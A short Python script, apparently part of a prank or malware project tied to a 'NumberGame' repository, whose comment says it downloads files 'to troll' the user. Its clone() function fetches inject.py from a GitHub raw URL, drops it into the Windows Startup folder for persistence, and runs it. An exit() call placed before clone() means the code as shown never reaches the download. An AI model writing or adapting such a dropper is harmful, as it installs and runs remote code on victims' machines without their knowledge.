# Downloads and injects the files needed to troll your dumbass
def clone():
    import os, urllib.request, pathlib
    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/inject.py'
    home = os.path.expanduser("~") #pathlib.Path.cwd()
    path = str(home) + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\inject.py'
    urllib.request.urlretrieve(dlurl, '{}'.format(path))
    os.system('inject.py')

def sleep(Time):
    import time as t
    t.sleep(Time)
sleep(3)
exit()

clone()